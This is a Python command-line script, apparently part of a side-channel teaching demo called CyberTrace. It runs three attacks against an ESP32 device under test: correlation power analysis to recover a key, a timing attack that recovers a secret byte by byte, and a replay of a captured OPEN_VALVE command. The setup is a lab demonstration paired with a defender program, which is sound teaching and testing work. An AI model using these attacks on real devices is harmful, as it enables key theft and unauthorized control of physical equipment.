"""CyberTrace attacker -- key recovery only.

The attacker can ONLY use the target's legitimate interface and measure power /
timing. It never toggles the device's defenses (that's the defender's program).
Its job is to recover the key and report the evidence.

Usage:
  python ct_attack.py cpa    [--traces N] [--hw] [--masked] [--out DIR]
  python ct_attack.py timing [--hw]
  python ct_attack.py replay [--hw]
"""

from __future__ import annotations

import argparse
import pathlib
import time

import numpy as np

import cpa
import report
from transport import open_transport

OUT_DEFAULT = str(pathlib.Path(__file__).resolve().parents[1] / "data" / "reports")
KNOWN_KEY0 = 0xDEADBEEF  # firmware's key word 0 -- used only to verify the demo


def cmd_cpa(args):
    tr = open_transport(args)
    print(f"[attacker] CPA via {tr.kind} transport, collecting {args.traces} traces...")
    t0 = time.time()
    counters, traces = cpa.collect(tr, args.traces, progress=max(args.traces // 5, 1))
    print(f"[attacker] collected in {time.time() - t0:.0f}s; analyzing...\n")
    result = cpa.analyze(counters, traces)
    result["transport"] = tr.kind
    report.print_cpa(result, known_key0=KNOWN_KEY0 if not args.hw else None)
    out = pathlib.Path(args.out)
    report.save_json(result, out / "cpa_report.json")
    if not args.no_plots:
        report.plot_cpa(result, counters, traces, out / "cpa_report.png")


def cmd_timing(args):
    tr = open_transport(args)
    secret_len = args.length
    print(f"[attacker] timing attack via {tr.kind}, {args.trials} trials/guess...")
    recovered = bytearray()
    detail = []
    for pos in range(secret_len):
        times = np.empty(256)
        for g in range(256):
            cand = bytes(recovered) + bytes([g]) + bytes(secret_len - pos - 1)
            times[g] = np.median([tr.check(cand)[1] for _ in range(args.trials)])
        order = np.argsort(times)[::-1]
        best, second = int(order[0]), int(order[1])
        recovered.append(best)
        detail.append({"pos": pos, "byte": best, "t_best": float(times[best]),
                       "t_second": float(times[second]),
                       "margin_us": float((times[best] - times[second]) * 1e6)})
    print("\n  TIMING ANALYSIS")
    print("  pos  byte  t_best(ms)  margin_to_2nd(us)")
    for d in detail:
        ch = chr(d["byte"]) if 32 <= d["byte"] < 127 else f"0x{d['byte']:02x}"
        print(f"   {d['pos']}   {ch!r:>5}  {d['t_best']*1e3:8.3f}   {d['margin_us']:8.1f}")
    print(f"  recovered secret = {bytes(recovered)!r}")
    print("  note: last byte has no iteration-count delta (known early-exit artifact)")


def cmd_replay(args):
    tr = open_transport(args)
    print(f"[attacker] replay attack via {tr.kind}")
    first = tr.command(1042, b"OPEN_VALVE")
    replay = tr.command(1042, b"OPEN_VALVE")
    print(f"  captured CMD counter=1042 -> accepted={first}")
    print(f"  replayed same packet       -> accepted={replay}")
    print(f"  RESULT: replay {'SUCCEEDED (device vulnerable)' if replay else 'BLOCKED (nonce defense active)'}")


def main():
    ap = argparse.ArgumentParser(description="CyberTrace attacker (key recovery only)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    pc = sub.add_parser("cpa")
    pc.add_argument("--traces", type=int, default=1500)
    pc.add_argument("--out", default=OUT_DEFAULT)
    pc.add_argument("--no-plots", action="store_true")
    pc.set_defaults(func=cmd_cpa)

    pt = sub.add_parser("timing")
    pt.add_argument("--trials", type=int, default=40)
    pt.add_argument("--length", type=int, default=4)
    pt.set_defaults(func=cmd_timing)

    pr = sub.add_parser("replay")
    pr.set_defaults(func=cmd_replay)

    for p in (pc, pt, pr):
        p.add_argument("--hw", action="store_true", help="drive the real ESP32")
        p.add_argument("--port", default="/dev/ttyAMA0")
        p.add_argument("--seed", type=int, default=None)
        p.add_argument("--masked", action="store_true", help="(sim) device-under-test has masking on")
        p.add_argument("--constant-time", action="store_true")
        p.add_argument("--nonce", action="store_true")

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
